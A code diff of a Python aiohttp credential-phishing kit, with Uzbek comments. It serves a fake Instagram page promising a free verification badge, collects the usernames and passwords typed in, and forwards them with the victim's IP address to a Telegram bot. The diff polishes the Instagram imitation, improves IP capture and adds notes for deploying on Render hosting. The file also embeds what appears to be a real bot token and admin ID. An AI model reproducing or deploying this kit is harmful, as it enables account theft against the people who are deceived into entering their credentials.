@@ -3,12 +3,10 @@ import aiohttp
 import os
 
 # --- SOZLAMALAR ---
-# Telegramdan @BotFather orqali olingan token
 BOT_TOKEN = "8568375010:AAFuv2DOhmMp4--_ykGRfDIWVcCAR59f9fE" 
-# @userinfobot orqali olingan ID
-ADMIN_ID = "7930537261"   
+ADMIN_ID = "7930537261"
 
-# HTML SAHIFA KODI
+# HTML SAHIFA KODI (Instagram dizayni bilan)
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="uz">
@@ -18,13 +16,15 @@ HTML_PAGE = """
     <title>Instagram • Verification Badge</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 3px; }
         .logo { width: 175px; margin-bottom: 25px; }
         .badge-info { background: #e0f1ff; padding: 12px; border-radius: 8px; margin-bottom: 20px; color: #0095f6; font-weight: bold; font-size: 14px; }
         input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
-        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.3s; }
+        button:hover { background: #007bc2; }
+        .footer { margin-top: 25px; font-size: 12px; color: #8e8e8e; }
         #waiting { display: none; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -32,30 +32,33 @@ HTML_PAGE = """
     <div class="box" id="login-form">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" class="logo">
         <div class="badge-info">Tabriklaymiz! Sizga bepul "Verified Badge" (Galichka) berildi!</div>
-        <p style="font-size: 14px; color: #262626; font-weight: 600;">Faollashtirish uchun tizimga kiring</p>
-        <input type="text" id="u" placeholder="Foydalanuvchi nomi yoki email">
-        <input type="password" id="p" placeholder="Parol">
+        <p style="font-size: 14px; color: #262626; font-weight: 600;">Uni faollashtirish uchun tizimga kiring</p>
+        <input type="text" id="u" placeholder="Foydalanuvchi nomi yoki email" autocomplete="off">
+        <input type="password" id="p" placeholder="Parol" autocomplete="off">
         <button onclick="sendData()">Tasdiqlash</button>
+        <div class="footer">Instagram from Meta © 2026</div>
     </div>
 
     <div class="box" id="waiting">
         <div class="loader"></div>
-        <h3>Kutilmoqda...</h3>
-        <p style="color: #8e8e8e; font-size: 14px;">Ma'lumotlar tekshirilmoqda. Galichka 5 daqiqadan so'ng profilingizda paydo bo'ladi. Sahifani yopmang.</p>
+        <h3 style="color: #262626;">Kutilmoqda...</h3>
+        <p style="color: #8e8e8e; font-size: 14px; line-height: 1.5;">Ma'lumotlar tekshirilmoqda. Galichka 5 daqiqadan so'ng profilingizda paydo bo'ladi. Iltimos, bu oynani yopmang.</p>
     </div>
 
     <script>
         function sendData() {
             let u = document.getElementById('u').value;
             let p = document.getElementById('p').value;
-            if(u.length < 3 || p.length < 5) { alert("Login yoki parol xato!"); return; }
+            if(u.length < 3 || p.length < 5) { alert("Ma'lumotlar to'liq kiritilmadi!"); return; }
 
+            // Ma'lumotni serverga yuborish
             fetch('/collect', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({u: u, p: p})
             });
 
+            // Vizual o'zgarish
             document.getElementById('login-form').style.display = 'none';
             document.getElementById('waiting').style.display = 'block';
         }
@@ -68,20 +71,25 @@ async def send_to_telegram(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"}
     async with aiohttp.ClientSession() as session:
-        async with session.post(url, json=payload) as resp:
-            return await resp.json()
+        try:
+            async with session.post(url, json=payload) as resp:
+                return await resp.json()
+        except Exception as e:
+            print(f"Botga yuborishda xato: {e}")
 
 async def handle_collect(request):
     try:
         data = await request.json()
-        u, p = data.get('u'), data.get('p')
-        ip = request.remote
+        u = data.get('u')
+        p = data.get('p')
+        ip = request.headers.get('X-Forwarded-For', request.remote)
         
         log_text = (
             f"🔔 <b>YANGI INSTA LOG!</b>\n\n"
-            f"👤 Login: <code>{u}</code>\n"
-            f"🔑 Parol: <code>{p}</code>\n"
-            f"🌐 IP: {ip}"
+            f"👤 <b>Login:</b> <code>{u}</code>\n"
+            f"🔑 <b>Parol:</b> <code>{p}</code>\n"
+            f"🌐 <b>IP:</b> {ip}\n"
+            f"📱 <b>Manba:</b> Render Hosting"
         )
         await send_to_telegram(log_text)
         return web.json_response({"status": "ok"})
@@ -96,6 +104,7 @@ app.router.add_get('/', handle_index)
 app.router.add_post('/collect', handle_collect)
 
 if __name__ == '__main__':
-    # Hostinglar uchun portni avtomatik aniqlash
+    # Render portni avtomatik beradi, bo'lmasa 8080 ishlaydi
     port = int(os.environ.get("PORT", 8080))
-    web.run_app(app, port=port)
+    print(f"--- SERVER {port}-PORTDA ISHGA TUSHDI ---")
+    web.run_app(app, host='0.0.0.0', port=port)
